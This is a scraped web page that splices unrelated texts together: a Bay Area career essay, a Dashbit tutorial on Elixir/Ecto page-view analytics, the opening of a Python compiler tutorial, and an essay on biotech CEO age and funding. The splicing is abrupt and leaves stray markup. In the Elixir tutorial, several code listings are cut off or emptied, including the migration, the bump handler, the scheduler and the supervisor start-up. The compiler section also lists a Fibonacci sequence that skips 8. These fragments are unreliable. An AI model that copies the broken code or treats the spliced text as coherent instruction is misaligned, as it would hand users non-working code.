<p>One of the best examples of long-term thinking can be found by studying business mogul Dhirubhai Ambani.</p>



<figure><img src="https://www.mrobusinesstoday.com/mrobackend/assets/uploads/dhirubhai-ambani.jpg" alt="" width="468" height="251"><figcaption><a href="https://www.mrobusinesstoday.com/">https://www.mrobusinesstoday.com/</a></figcaption></figure>



<p><a href="http://doerlife.com/dhirubhai-ambani-on-networking/">He had a habit of visiting the Taj hotel</a> for a cup of tea in the evenings. But, his friends refused to join him. They thought the tea there was overpriced. After all, he was paying close to $50 for a cup of tea (at that time), whereas they would get the same tea down the road for $5. Was he out of his mind? $45 a day can add up. When they asked him about his crazy habit, he said:&nbsp;“I’m paying five bucks for the tea and another 45 bucks because the Taj gives me the opportunity to connect with the city’s most influential people.”</p>



<p>I know what you’re thinking. The world has changed. Twitter allows me to connect with anyone, anywhere in the world. I don’t need to pay for overpriced tea to have access to the most influential people. Sure. But, if you’re interested in building a successful career in tech, nothing comes close to sitting down for a cup of coffee with another founder, or VP even if you have to sit on a patio and wear facemasks. Don’t feel bad for paying a premium to access the best opportunities in the world.&nbsp;</p>



<p>Lastly, it’s in our nature to overreact. Unexpected changes to our lives lead us to believe that the world will never be the same.</p>



<p>When I was living in Los Angeles, I remember the night Trump sealed his victory over Hillary. I was at a birthday party, which started to feel like a funeral when two of my girlfriends started bawling their eyes out. One of my buddies said he was going to liquidate his stocks because we were headed for an epic crash. After all, Trump was unstable and there was nothing the markets hated more than instability. On top of that, people all over the internet were threatening to pack up their stuff and move to Canada.&nbsp;</p>



<p>I see our reaction to COVID through the same lens. People are overreacting to the long term changes caused by it. Has it shifted work culture to a hybrid model where you can work from anywhere? Yes. And, that’s great. If anything, It’s made humanity more resilient and to bet against human ingenuity is foolish. We’ve solved harder problems in the past and we will solve COVID.</p>



<p>Do you think people are just going to Netflix and chill and order DoorDash for the rest of their lives? That would be a sad existence. Most people I know love nothing more than spending their hard-earned dollars on experiences. And, I’m not talking about VR. </p>

<p>There’s too much money on the line for us to not figure this out. My fiancé and I just pushed our wedding to next year, which means we also pushed our honeymoon. No one is going to settle for Zoom weddings or staycation honeymoons. Even if that’s the only reason we solve COVID, we will either come up with a cure or beat this virus when everyone understands the ROI of masks.&nbsp;</p>



<p>When we do, the streets of SoMa are going to be bustling once again with people in Patagonia vests skipping over human feces in their Allbirds on their way to the office.</p>



<p><strong>Don’t move to Denver</strong>.&nbsp;</p>



<ul><li>If you’re early in your career and want to take advantage of the best opportunities in tech, there’s no place like the Bay Area. Take advantage of the same serendipity that introduced&nbsp;Mark Zuckerberg to Peter Thiel.&nbsp;</li></ul>



<ul><li>The fastest-growing SaaS companies are here. Executives at these companies will start the next wave of hypergrowth companies just like when Todd McKinnon left Salesforce to start Okta.</li></ul>



<ul><li>Don’t be a short-term thinker. Pay the premium to access the best opportunities in the world. You won’t be thinking about the $1000 a month you could’ve saved if you had just played it safe in your 20’s. As the saying goes, “you’re the average of the five people you spend the most time with.” The quality of talent in the Bay Area will be the forcing mechanism you need to reach your full potential.&nbsp;&nbsp;</li></ul>



<ul><li>Lastly, overreacting can have serious consequences. <a href="https://thereformedbroker.com/2020/06/16/one-fifth-of-investors-sold-all-their-stocks/">18% of all Fidelity account owners</a> dumped all of their stock between February and May. They thought the world was going to end and missed one of the most epic stock markets rebounds in history. Don’t do that. </li></ul>



<p>We will beat COVID. And, when we do, a chance meeting in San Francisco can lead to the biggest opportunity of your career.</p>

  </li>
</ul>
<p>
For the Dashbit website, we wanted to avoid tracking users as much as possible. This means no cookies and unfortunately most analytics use cookies for tracking and/or fingerprinting. However, we still want to see which pages on our website are being frequently accessed. For this purpose, we have decided to roll our own analytics system.</p>
<p>
In this article, we will cover how we implemented the analytics system with Ecto upserts and how we have used the Elixir registry and Elixir processes to reduce the pressure on the database.</p>
<h2>
Tracking with upserts</h2>
<p>
The idea is very simple: every time someone accesses a page, we will store this information in the database. However, we don’t need to track each access at the instant they happen. For us, tracking how many accesses a page had in a day is completely fine. Therefore, every time a page is accessed on a given date, we will attempt to insert an entry in the database. If an entry already exists, we update its counter instead.</p>
<p>
Luckily, this can be done with an upsert in Ecto. Let’s first define the schema for the database resource:</p>
<pre><code><span>defmodule</span><span> </span><span>MyApp.Metrics.Metric</span><span> </span><span data-group-id="6781915709-1">do</span><span>
  </span><span>use</span><span> </span><span>Ecto.Schema</span><span>

  </span><span>@primary_key</span><span> </span><span>false</span><span>
  </span><span>schema</span><span> </span><span>"metrics"</span><span> </span><span data-group-id="6781915709-2">do</span><span>
    </span><span>field</span><span> </span><span>:date</span><span>,</span><span> </span><span>:date</span><span>,</span><span> </span><span>primary_key</span><span>:</span><span> </span><span>true</span><span>
    </span><span>field</span><span> </span><span>:path</span><span>,</span><span> </span><span>:string</span><span>,</span><span> </span><span>primary_key</span><span>:</span><span> </span><span>true</span><span>
    </span><span>field</span><span> </span><span>:counter</span><span>,</span><span> </span><span>:integer</span><span>,</span><span> </span><span>default</span><span>:</span><span> </span><span>0</span><span>
  </span><span data-group-id="6781915709-2">end</span><span>
</span><span data-group-id="6781915709-1">end</span></code></pre>
<p>
It has three fields: a date, the page path, and the counter (number of accesses). The date and path make a composite primary key. Our migration looks like this:</p>
<pre><code><span>defmodule</span><span> </span><span>Dashbit.Repo.Migrations.CreateMetrics</span><span> </span><span data-group-id="1237551938-1">do</span><span>
  </span><span>use</span><span> </span><span>Ecto.Migration</span><span>

      </span><span>add</span><span> </span><span>:date</span><span>,</span><span> </span><span>:date</span><span>,</span><span> </span><span>primary_key</span><span>:</span><span> </span><span>true</span><span>

  </span><span data-group-id="1237551938-2">end</span><span>

<p>
The code above performs an upsert, incrementing the number of accesses in a page by the value of <code>counter</code>, which is typically 1. If an entry does not exist, one is immediately created.</p>
<p>
This is the core of our analytics. It is a very straight-forward solution, but it does have a strong requirement on the database accepting all of our writes. While most applications heavily rely on a database, the analytics system is the only place in our website that uses a database, so we believe it is important to show an article, such as this blog post, even if there is an error when talking to the storage layer. To address this, we have decided to move the upserts to separate processes.</p>
<h2>
Async and batched writes with processes</h2>
<p>
As laid out in the previous section, we want to move all the database writes done by our analytics code to a separate process. Another concern we have with our solution so far is how it will handle overloads. If there is a huge spike in traffic, could we end up putting too much pressure in the database? In this sense, would it be a good idea to batch our writes?</p>
<p>
To be honest, our application will be just fine with spikes. Most of our page loads are within hundreds of microseconds, thanks to Phoenix, and our database usage is minimal. On the other hand, such a small project is a perfect opportunity to experiment, so we decided to explore how our analytics solution would look like if we performed writes asynchronously and in batches.</p>
<p>
Here is what we came up with. Every time a user accesses a page, we will spawn an Elixir process that tracks all accesses to that page. If a process already exists for said page, we will message the existing process instead. The goal of this process is to collect all accesses within a time interval, writing to the database after X seconds.</p>
<p>
We are going to call this the <code>Worker</code> process and it starts like this:</p>
<pre><code><span>defmodule</span><span> </span><span>Dashbit.Metrics.Worker</span><span> </span><span data-group-id="5734826703-1">do</span><span>
  </span><span>use</span><span> </span><span>GenServer</span><span>,</span><span> </span><span>restart</span><span>:</span><span> </span><span>:temporary</span></code></pre>
<p>
We define a module for the process and declare it as a <a href="https://hexdocs.pm/elixir/GenServer.html"><code>GenServer</code></a>. We also say that this process is <code>:temporary</code>. I.e. if it dies, we don’t want the supervisor to restart it. That’s because we are assuming that, if the process dies, our logic that dynamically spawns processes for each page will eventually start a new one anyway.</p>
<p>
Next we define the <code>init</code> callback of the process:</p>
<pre><code><span>  </span><span>@impl</span><span> </span><span>true</span><span>
  </span><span>def</span><span> </span><span>init</span><span data-group-id="1587488502-1">(</span><span>path</span><span data-group-id="1587488502-1">)</span><span> </span><span data-group-id="1587488502-2">do</span><span>
    </span><span>Process</span><span>.</span><span>flag</span><span data-group-id="1587488502-3">(</span><span>:trap_exit</span><span>,</span><span> </span><span>true</span><span data-group-id="1587488502-3">)</span><span>
    </span><span data-group-id="1587488502-4">{</span><span>:ok</span><span>,</span><span> </span><span data-group-id="1587488502-5">{</span><span>path</span><span>,</span><span> </span><span>_counter</span><span> </span><span>=</span><span> </span><span>0</span><span data-group-id="1587488502-5">}</span><span data-group-id="1587488502-4">}</span><span>
  </span><span data-group-id="1587488502-2">end</span></code></pre>
<p>
The <code>init</code> callback traps exits and sets the process state to <code>{path, 0}</code>. The first element is the page path, the second element is the number of page visits.</p>
<p>
Our process should be able to receive a <code>:bump</code> message. This message is sent whenever we need to bump the counter and is handled by the <code>handle_info</code> callback:</p>
<pre><code><span>  </span><span>@impl</span><span> </span><span>true</span><span>
  </span><span>def</span><span> </span><span>handle_info</span><span data-group-id="7044761336-1">(</span><span>:bump</span><span>,</span><span> </span><span data-group-id="7044761336-2">{</span><span>path</span><span>,</span><span> </span><span>0</span><span data-group-id="7044761336-2">}</span><span data-group-id="7044761336-1">)</span><span> </span><span data-group-id="7044761336-3">do</span><span>

  </span><span data-group-id="7044761336-9">end</span></code></pre>
<p>
If we receive the <code>:bump</code> when the page had no access (i.e. counter is zero), we will bump the counter to 1 and we will also schedule an upsert event, so we eventually write those accesses to the database. If the counter is more than 0, we simply bump it and return an updated state.</p>
<p>
The scheduling and upsert code will look like this:</p>
<pre><code><span>  </span><span>defp</span><span> </span><span>schedule_upsert</span><span data-group-id="6238594391-1">(</span><span data-group-id="6238594391-1">)</span><span> </span><span data-group-id="6238594391-2">do</span><span>

    </span><span># same function as the previous section</span><span>
  </span><span data-group-id="6238594391-13">end</span></code></pre>
<p>
The <code>schedule_upsert()</code> function schedules a message to the current process (<code>self()</code>). The message will be named <code>:upsert</code> and it will be delivered in a random value between 10s to 20s. The reason we picked a random value is to avoid a scenario where multiple processes for different pages are spawned at the same time and they all write to the database at the same time.</p>
<p>
Next we define another <code>handle_info</code> clause, this time to handle the scheduled <code>:upsert</code> message. This clause simply invokes the <code>upsert!</code> function, defined in the previous section, and resets the state back to <code>{path, 0}</code>. This makes it so that, once there is a new bump, we will schedule a new upsert.</p>
<p>
Finally, we implement the <code>terminate</code> callback, which will be invoked whenever our application is shutting down:</p>
<pre><code><span>  </span><span>@impl</span><span> </span><span>true</span><span>
  </span><span>def</span><span> </span><span>terminate</span><span data-group-id="1299229119-1">(</span><span>_</span><span>,</span><span> </span><span data-group-id="1299229119-2">{</span><span>_path</span><span>,</span><span> </span><span>0</span><span data-group-id="1299229119-2">}</span><span data-group-id="1299229119-1">)</span><span>,</span><span> </span><span>do</span><span>:</span><span> </span><span>:ok</span><span>
  </span><span>def</span><span> </span><span>terminate</span><span data-group-id="1299229119-3">(</span><span>_</span><span>,</span><span> </span><span data-group-id="1299229119-4">{</span><span>path</span><span>,</span><span> </span><span>counter</span><span data-group-id="1299229119-4">}</span><span data-group-id="1299229119-3">)</span><span>,</span><span> </span><span>do</span><span>:</span><span> </span><span>upsert!</span><span data-group-id="1299229119-5">(</span><span>path</span><span>,</span><span> </span><span>counter</span><span data-group-id="1299229119-5">)</span><span>
</span><span>end</span></code></pre>
<p>
If our application is shutting down, we may have pending writes in our worker, so we want to send them to the database as part of our termination logic. One important thing to remember is that the <code>terminate</code> callback is not called by default when shutting down, unless you are trapping exits. That’s why we called <code>Process.flag(:trap_exit, true)</code> in the <code>init</code> function.</p>
<p>
The process we just implemented delivers all of the requirements we have so far: writes are now asynchronous, as they happen in a separate process, and they are also batched, using intervals between 10s and 20s. The last step we need to implement is to actually spawn those processes on the fly as users navigate through the website.</p>
<h2>
Dynamic processes with the Elixir registry</h2>
<p>
In order to spawn and find processes for each page, we are going to use <a href="https://hexdocs.pm/elixir/Registry.html">Elixir’s <code>Registry</code></a>. We also need a dynamic supervisor which is going to be the parent of all worker processes. Let’s implement this logic in the overaching <code>Metrics</code> module, alongside our <code>bump(page)</code> function.</p>
<p>
Let’s get started with the basics:</p>
<pre><code><span>defmodule</span><span> </span><span>Dashbit.Metrics</span><span> </span><span data-group-id="8546136914-1">do</span><span>
  </span><span>use</span><span> </span><span>Supervisor</span><span>

  </span><span>@worker</span><span> </span><span>Dashbit.Metrics.Worker</span><span>
  </span><span>@registry</span><span> </span><span>Dashbit.Metrics.Registry</span><span>
  </span><span>@supervisor</span><span> </span><span>Dashbit.Metrics.WorkerSupervisor</span></code></pre>
<p>
Our <code>Dashbit.Metrics</code> module is a <a href="https://hexdocs.pm/elixir/Supervisor.html"><code>Supervisor</code></a>, which will have two children: the registry and the supervisor of all workers. Since the workers are started dynamically, as requests come, we will use a <code>DynamicSupervisor</code>. We store the names of the worker, registry and dynamic supervisor processes in module attributes for convenience.</p>
<p>
Next we will define how our supervisor is started and its <code>init</code> callback:</p>
<pre><code><span>  </span><span>def</span><span> </span><span>start_link</span><span data-group-id="8570317183-1">(</span><span>_opts</span><span data-group-id="8570317183-1">)</span><span> </span><span data-group-id="8570317183-2">do</span><span>

  </span><span>@impl</span><span> </span><span>true</span><span>

  </span><span data-group-id="8570317183-5">end</span></code></pre>
<p>
With the registry and dynamic supervisor in place, we can write the bump function:</p>
<pre><code><span>  </span><span>def</span><span> </span><span>bump</span><span data-group-id="1140714578-1">(</span><span>path</span><span data-group-id="1140714578-1">)</span><span> </span><span>when</span><span> </span><span>is_binary</span><span data-group-id="1140714578-2">(</span><span>path</span><span data-group-id="1140714578-2">)</span><span> </span><span data-group-id="1140714578-3">do</span><span>

<p>
The <code>bump</code> function looks up in the registry if there is a process for the given path and returns its process identifier (<code>pid</code>). If one does not exist, we ask the worker supervisor to start a worker dynamically. We expect two possible outcomes from <code>start_child</code>:</p>
<ul>
  <li>
    <p>
<code>{:ok, pid}</code> - the worker was started    </p>
  </li>
  <li>
    <p>
<code>{:error, {:already_started, pid}}</code> - a worker for the given <code>path</code> already exists    </p>
  </li>
</ul>
<p>
We need the second branch to address a potential race condition where two users may access a page for the first time at the same time. In this scenario, the <code>Registry.lookup/2</code> will fail for both them, and both will attempt to spawn the worker. One of them will succeed and the other will return the “already started” error. Once we find the <code>pid</code>, we send it the <code>:bump</code> message.</p>
<p>
We are almost there. There are just two steps left. …</p></article></div></div>

<br><h3>Let's make a Teeny Tiny compiler, part 1</h3><p><small>5/5/2020</small></p><p>

<img src="http://austinhenley.com/blog/images/knightdragon.jpg"></p><p><i>This is the first post in a three part series. Check out <a href="http://web.eecs.utk.edu/~azh/blog/teenytinycompiler2.html">part 2</a> and <a href="http://web.eecs.utk.edu/~azh/blog/teenytinycompiler3.html">part 3</a> when you are ready.</i></p>

<p>It is a beautiful day outside, so let's make a compiler. You don't need any knowledge of how compilers work to follow along. We are going to use Python to implement our own programming language, Teeny Tiny, that will compile to C code. It will take about 500 lines of code and provide the initial infrastructure needed to customize and extend the compiler into your own billion dollar production-ready compiler.</p>

<p>This tutorial is a series of posts that go step by step in building a working compiler. All of the source code can be found in the GitHub <a href="https://github.com/AZHenley/teenytinycompiler">repo</a>. If you follow along with all the posts, I guesstimate that it will take you only a few hours.

</p><p>The Teeny Tiny language we are going to implement is a dialect of <a href="https://en.wikipedia.org/wiki/BASIC">BASIC</a>. The syntax is clean and simple. If you prefer a <a href="https://en.wikipedia.org/wiki/C_(programming_language)">C</a>-like syntax then it will be trivial to modify the compiler at the end.  Here is an example program in our Teeny Tiny language:</p>

<pre>PRINT "How many fibonacci numbers do you want?"
INPUT nums

LET a = 0
LET b = 1
WHILE nums &gt; 0 REPEAT
    PRINT a
    LET c = a + b
    LET a = b
    LET b = c
    LET nums = nums - 1
ENDWHILE	
</pre>

<p>This program prints out terms of the fibonacci sequence based on the user's input: 0 1 1 2 3 5 13...</p>

<p>Our language will allow a variety of the basic operations that you'd expect from a programming language. In particular, it will support:</p>

<ul>
	<li>Numerical variables</li>
	<li>Basic arithmetic</li>
	<li>If statements</li>
	<li>While loops</li>
	<li>Print text and numbers</li>
	<li>Input numbers</li>
	<li>Labels and goto</li>
	<li>Comments</li>
</ul>

<p>Although this is a standard subset of features, you may notice that there are no functions, no arrays, no way to read/write from a file, and not even an else statement. But with just this small set of constructs, you can actually do a lot. It will also setup the compiler in such a way that many other features will be straight forward to add later.</p>

<h4>Compiler Overview</h4>

<p><img src="http://austinhenley.com/blog/images/compilersteps.png"></p><p>Our compiler will follow a three step process that is illustrated above. First, given the inputted source code, it will break the code up into <i>tokens</i>. These are like words and punctuation in English. Second, it will <i>parse</i> the tokens to make sure they are in an order that is allowed in our language. Just like English sentences follow specific structures of verbs and nouns. Third, it will <i>emit</i> the C code that our language will translate to.</p>

<p>We will use these three steps as the main organization for our code. The lexer, parser, and emitter will each have their own Python code file. This tutorial is broken up into 3 parts based on these steps as well. If you were to extend the compiler, there are some additional steps you would add, but we will hold off on discussing those.</p>



<h4>Lexer Overview</h4>

<p>The first module of our compiler is called the <i>lexer</i>. Given a string of Teeny Tiny code, it will iterate character by character to do two things: decide where each token starts/stops and what type of token it is. If the lexer is unable to do this, then it will report an error for an invalid token.</p>

<p><img src="http://austinhenley.com/blog/images/tokens.png"></p><p>The figure demonstrates an example input and output of the lexer. Given the Teeny Tiny code, the lexer must determine where the tokens are along with the type (e.g., keyword). You can see that spaces aren't recognized as tokens, but the lexer will use them as one way to know when a token ends.</p>

<p>Let's finally get into some code, starting with the structure of the lexer in the file <b>lex.py</b>:</p>

<pre>class Lexer:
    def __init__(self, input):
        pass

    # Process the next character.
    def nextChar(self):
        pass

    # Return the lookahead character.
    def peek(self):
        pass

    # Invalid token found, print error message and exit.
    def abort(self, message):
        pass
		
    # Skip whitespace except newlines, which we will use to indicate the end of a statement.
    def skipWhitespace(self):
        pass
		
    # Skip comments in the code.
    def skipComment(self):
        pass

    # Return the next token.
    def getToken(self):
        pass
</pre>

<p>I like to sketch out all the functions that I think I will need, then go back and fill them in. The function <b>getToken</b> will be the meat of the lexer. It will be called each time the compiler is ready for the next token and it will do the work of classifying tokens. <b>nextChar</b> and <b>peek</b> are helper functions for looking at the next character. <b>skipWhitespace</b> consumes the spaces and tabs that we don't care about. <b>abort</b> is what we will use to report an invalid token.</p>

<p>The lexer needs to keep track of the current position in the input string and the character at that position. We will initialize these in the constructor:</p>

<pre>    def __init__(self, input):
        self.source = input + '\n' # Source code to lex as a string. Append a newline to simplify lexing/parsing the last token/statement.
        self.curChar = ''   # Current character in the string.
        self.curPos = -1    # Current position in the string.
        self.nextChar()
</pre>

<p>The lexer needs the input code and we append a newline to it (this just simplifies some checks later on). <b>curChar</b> is what the lexer will constantly check to decide what kind of token it is. Why not just do <i>source[curPos]</i>? Because that would litter the code with bounds checking. Instead we do this in <b>nextChar</b>:</p>

<pre>    # Process the next character.
    def nextChar(self):
        self.curPos += 1
        if self.curPos &gt;= len(self.source):
            self.curChar = '\0'  # EOF
        else:
            self.curChar = self.source[self.curPos]
</pre>

<p>This increments the lexer's current position and updates the current character. If we reach the end of the input, set the character to the end-of-file marker. This is the only place we will modify curPos and curChar. But sometimes we want to look ahead to the next character without updating curPos:</p>

<pre>    # Return the lookahead character.
    def peek(self):
        if self.curPos + 1 &gt;= len(self.source):
            return '\0'
        return self.source[self.curPos+1]
</pre>

<p>We should make sure these functions work. Let's test them by create a new file <b>teenytiny.py</b>:</p>

<pre>from lex import *

def main():
	input = "LET foobar = 123"
	lexer = Lexer(input)

	while lexer.peek() != '\0':
		print(lexer.curChar)
		lexer.nextChar()

main()
</pre>

<p>Run this and the output should be every character of the input string, <i>LET foobar = 123</i>, on a new line:</p>

<pre>L
E 
T 

f 
o 
o 
b 
a 
r 

= 

1 
2 
3 

</pre>

<h4>Classifying Tokens</h4>

<p>But we don't just want characters, we want tokens! We need to plan how combining individual characters together makes a token, which works much like a state machine. Here are the main lexer rules for the Teeny Tiny language:</p>

<ul>
	<li>Operator. One or two consecutive characters that matches: + - * / = == != &gt; &lt; &gt;= &lt;=</li>
	<li>String. Double quotation followed by zero or more characters and a double quotation. Such as: "hello, world!" and ""</li>
	<li>Number. One or more numeric characters followed by an optional decimal point and one or more numeric characters. Such as: 15 and 3.14</li>
	<li>Identifier. An alphabetical character followed by zero or more alphanumeric characters.</li>
	<li>Keyword. Exact text match of: LABEL, GOTO, PRINT, INPUT, LET, IF, THEN, ENDIF, WHILE, REPEAT, ENDWHILE</li>
</ul>

<p>Next we will start our <b>getToken</b> function in our <b>Lexer</b> class:</p>

<pre>    # Return the next token.
    def getToken(self):
        # Check the first character of this token to see if we can decide what it is.
        # If it is a multiple character operator (e.g., !=), number, identifier, or keyword then we will process the rest.
        if self.curChar == '+':
            pass	# Plus token.
        elif self.curChar == '-':
            pass	# Minus token.
        elif self.curChar == '*':
            pass	# Asterisk token.
        elif self.curChar == '/':
            pass	# Slash token.
        elif self.curChar == '\n':
            pass	# Newline token.
        elif self.curChar == '\0':
            pass	# EOF token.
        else:
            # Unknown token!
            pass
			
        self.nextChar()
</pre>

<p>This will detect a few possible tokens, but doesn't do anything useful yet. What we need next is a <b>Token</b> class to keep track of what type of token it is and the exact text from the code. Place this in <b>Lex.py</b> for now:</p>

<pre># Token contains the original text and the type of token.
class Token:   
    def __init__(self, tokenText, tokenKind):
        self.text = tokenText   # The token's actual text. Used for identifiers, strings, and numbers.
        self.kind = tokenKind   # The TokenType that this token is classified as.
</pre>

<p>To specify what type a token is, we will create the <b>TokenType</b> class as an enum. It looks long, but it just specifies every possible token our language allows. Add <i>import enum</i> to the top of <b>Lex.py</b> and add this class:</p>

<pre># TokenType is our enum for all the types of tokens.
class TokenType(enum.Enum):
	EOF = -1
	NEWLINE = 0
	NUMBER = 1
	IDENT = 2
	STRING = 3
	# Keywords.
	LABEL = 101
	GOTO = 102
	PRINT = 103
	INPUT = 104
	LET = 105
	IF = 106
	THEN = 107
	ENDIF = 108
	WHILE = 109
	REPEAT = 110
	ENDWHILE = 111
	# Operators.
	EQ = 201  
	PLUS = 202
	MINUS = 203
	ASTERISK = 204
	SLASH = 205
	EQEQ = 206
	NOTEQ = 207
	LT = 208
	LTEQ = 209
	GT = 210
	GTEQ = 211
</pre>

<p>Now we can expand <b>getToken</b> to actually do something when it detects a specific token:</p>

<pre>    # Return the next token.
    def getToken(self):
        token = None

        # Check the first character of this token to see if we can decide what it is.
        # If it is a multiple character operator (e.g., !=), number, identifier, or keyword then we will process the rest.
        if self.curChar == '+':
            token = Token(self.curChar, TokenType.PLUS)
        elif self.curChar == '-':
            token = Token(self.curChar, TokenType.MINUS)
        elif self.curChar == '*':
            token = Token(self.curChar, TokenType.ASTERISK)
        elif self.curChar == '/':
            token = Token(self.curChar, TokenType.SLASH)
        elif self.curChar == '\n':
            token = …</pre></div></div></div>

              <p><i><p>“Probably only at the very beginning of an industry do you have the kind of work that some of us did at Genentech early on.... The entire industry is at a different stage now.

                <p>In the early days at Genentech one or two or three people could do the major amount of work to take an idea to the compound that was a drug.”</p>
                <p>- David Goeddel, 2001, as interviewed by Sally Smith Hughes <sup>1</sup></p>
                </i>
              </p>
              
          </div>
          <p>A <a href="https://www.baybridgebio.com/blog/young_founders_1.html">previous post</a> showed that, historically, young CEOs are capable of building very successful biotech <sup>2</sup> companies.  If that’s the case, why do so few young biotech CEOs get funded today?</p>
          <p>There are many valid reasons for preferring experienced CEOs: they are used to the level of rigor of industrial science, have experience managing drug discovery programs, understand the drug discovery and development process, have extensive networks, have experience with FDA, and have a nose for commercially viable science.</p>
          <p>There are also many valid reasons for preferring younger CEOs: they are closer to the latest science and technology, they are less constrained by conventional ways of thinking, and they bring fresh perspectives, optimism and ambition.</p>
          <p>Some companies, like asset-centric virtual startups, are probably best run by experienced CEOs.  But young, technical CEOs are probably well suited to build the next gene editing or synthetic biology platform.</p>
          <p>Both experienced and inexperienced entrepreneurs have strengths and weaknesses.  But the industry today seems to disproportionately emphasize the virtues of experience and undervalue the virtues of youth.  The industry is structured to turbocharge the strengths of experienced entrepreneurs and build support systems to complement their weaknesses.  But there don't seem to be as many groups that put young technical founders front-and-center, and build support systems to compensate for their lack of experience and networks.</p>
          <p>Why is this?  I hypothesize that the industry’s current preference for experienced CEOs is a rational response to the “dark ages” of the late 1990s and 2000s, one of the most challenging environments ever for biotech VC and pharma R&amp;D (the industry seems to have emerged from this period, and that's the topic of the next post):</p>
          <ul>
              <li><b>Eroom's Law</b> put the cost of developing a drug out of reach of cash-strapped startups.</li>
              <li>A <b>conservative FDA</b> was approving fewer new drugs, and big companies were better able to absorb regulatory risk than were startups.</li>
              <li>The breakthrough technologies of the turn of the century – gene and cell therapy 1.0, antisense therapy, the sequencing of the human genome – that could have fueled the next wave of startups proved to be more <b>hype than reality</b> <sup>3</sup>.</li>
              <li>The <b>exit environment was challenging</b>, so it was hard for biotech venture investors to make money.</li>
              <li>The "low-hanging fruit" of drug discovery was picked, and as discovery projects became more complex, skilled managers increased in importance relative to highly productive individual contributors.</li>
              <li>Investors became more risk-averse in response to these challenges.  <b>Investors reduced “management risk” by not funding young CEOs</b>.</li>
          </ul>
          <p>Another unfortunate side effect of this challenging time was that an entire generation of would-be entrepreneurs, investors and industry scientists never got training in industrial biotech or exposure to how science-based companies were built.  Pharma was cutting R&amp;D, biotech companies weren’t taking big science risk, and investors were abandoning biotech.  This depleted the stock of promising young scientists with industry training -- the exact kind of person you'd hope to fund as an entrepreneur.</p>

          <br>
          <h3>Biotech's "dark age"</h3>
          <p>The period from the late 1970s to early 1990s was a boom time for biotech startups, with startups like Genentech, Amgen and Biogen using recombinant DNA technology to create a whole new class of medicines.  These startups, initially viewed as crazy by established pharma companies, ultimately reshaped the industry.  This “golden age of molecular biology” peaked in the 1980s and saw the creation of many large and lasting companies.</p>
          <p><img src="https://www.baybridgebio.com/Images/founding_date_valuation.png"></p><p>The period from 1995 to today was a different story.  Only six $10B+ biotherapeutics companies have been started since 1995 (Actelion, BioMarin, Pharmasset, Seattle Genetics, Kite and Juno), and only two have been started since 2000 (Kite and Juno).  Of course, it takes time for these companies to grow to such valuations, so there are probably some companies founded recently that will get to that level in time (Alnylam is nearly at a $10B market cap and was founded in 2002; John Maragone, the first CEO, was 38 at the time).  But compared to the 1970s and 1980s, the 1990s and 2000s were a challenging time for ambitious biotech startups and their investors.</p>
          <p>Why was this period so challenging?</p>
          <br>
          <h3>Declining R&amp;D productivity and "Eroom's Law"</h3>
          <p>A major driver of the struggles of biotech and pharma was, and continues to be, ever-decreasing returns to R&amp;D investment.  The number of approved drugs per dollar of R&amp;D spent is on a steady, long-term decline (chart from <a href="https://www.nature.com/articles/nrd3681">Scannell et al, Nature Reviews Drug Discovery 2012</a>):</p>
          <p><img src="https://www.baybridgebio.com/Images/erooms_nature_2012.png"></p><p>This phenomenon is “Eroom’s Law” (“Moore’s Law” backwards): the cost of developing a drug increases exponentially over time, despite dramatic improvements in efficiency at various steps of the drug development process (some of these efficiency gains approximating Moore’s Law) <sup>4</sup>.</p>
          <p>This drop in R&amp;D productivity, combined with the <a href="https://www.uspharmacist.com/article/drug-patent-expirations-and-the-patent-cliff">“patent cliff”</a> where a huge wave of blockbuster drugs all lost patent protection within a few years, led to the first ever year of <a href="https://www.fiercepharma.com/regulatory/behold-patent-cliff-u-s-drug-market-shrinks-for-first-time">declining US revenue</a> for the pharma industry in 2012.  Pharma companies responded to these challenges with <a href="https://www.sciencemag.org/careers/2011/12/pharma-industry-crisis">massive layoffs</a>: some estimated that <a href="https://xconomy.com/national/2013/02/18/biotech-pharma-whining-about-talent-should-look-in-the-mirror/">150,000 pharma employees were laid off from 2009-2012</a>.  These layoffs, combined with a general investor retreat from biotech, made it very difficult for young scientists to get training in the business of building and investing in science-driven companies.</p>
          <p>The point of all this is that by the 2000s, drug development had become more expensive than the industry had anticipated, and you couldn’t take a drug from bench to bedside on a startup or academic budget.  So startups focused on less expensive, <a href="https://xconomy.com/national/2012/07/02/whos-still-active-among-the-early-stage-biotech-vcs/">later-stage</a> projects, like reformulations / repurposing, orphan drugs, or lower-risk development plans.  These were not the kinds of projects that would become $10B+ companies.</p>
          <p>A corollary to this is that as the low-hanging fruit was picked, companies had to work harder for new drugs (as mentioned in the opening quote of this paper).  In the early days of biotech, a few smart, dedicated scientists could make a drug.  Genentech's first products were recombinant versions of proteins that were already known to be therapeutic, and that were relatively simple to clone.  After that, they had to tackle targets with less well-understood biology, or create drugs with more complex structures.  As complexity grew, research teams grew in size, and the importance of experienced managers increased in relation to highly productive individual contributors.</p>
          <p>Around the turn of the century, new technologies like antisense therapy, gene therapy, cell therapy and genomic medicine promised to create new therapeutic white space that nimble startups were well-suited to explore.  Unfortunately, these technologies did not prove ready for prime time.  The first gene therapies, engineered cell therapies and antisense therapies were approved by FDA just in the last few years, despite significant hype around these technologies as far back as the 1990s.</p>
          <br>
          <h3>Fewer FDA Approvals</h3>
          <p>Simultaneously, FDA was approving fewer new drugs (chart from <a href="https://uk.reuters.com/article/us-pharmaceuticals-approvals/new-drug-approvals-fall-to-six-year-low-in-2016-idUKKBN14M08R">Reuters</a>).</p>
          <p><img src="https://www.baybridgebio.com/Images/fda_approvals_1993_to_2017.png"></p><p>During the 2000s, FDA was approving roughly half the number of drugs per year as it has been since ~2012.  While FDA issues certainly affected big pharma as well as startups, an FDA delay could easily kill a startup, while big companies could generally absorb the blow.</p>
          <p>Part of this may have been a function of declining R&amp;D productivity (ie pharma was not submitting as many quality drugs for approval, so fewer would be approved; I don’t have data on FDA approval rates going back decades), but FDA anecdotally seemed more conservative during the 2000s than today (understandably, given things like Vioxx’s undisclosed cardiovascular risks and patient deaths).</p>

          <h3>Challenging exit environment compressing VC returns</h3>
          <p>The 2000s was also a tough decade for IPOs and M&amp;A.  In order for investors and entrepreneurs to make money, startups need to “exit”: typically by either selling the startup to a bigger company, or “going public” through an IPO, allowing them to sell stock to the public.  If the IPO and M&amp;A markets are not accommodating, it can be very hard for investors to make money.</p>

